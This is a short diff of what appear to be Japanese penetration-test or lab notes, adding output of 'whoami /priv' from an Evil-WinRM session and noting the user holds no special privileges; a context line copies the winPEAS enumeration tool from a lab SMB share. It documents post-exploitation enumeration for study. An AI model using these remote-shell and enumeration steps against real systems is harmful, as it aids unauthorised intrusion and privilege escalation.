@@ -55,7 +55,21 @@ cp \\192.168.49.104\share\winPEASx64.exe .
 
 ### ユーザー
 
-```
+- 権限は特になし
+```powershell
+*Evil-WinRM* PS C:\Windows\Panther> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                          State
+============================= ==================================== =======
+SeShutdownPrivilege           Shut down the system                 Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+SeUndockPrivilege             Remove computer from docking station Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
+SeTimeZonePrivilege           Change the time zone                 Enabled
+
 ```
 
 
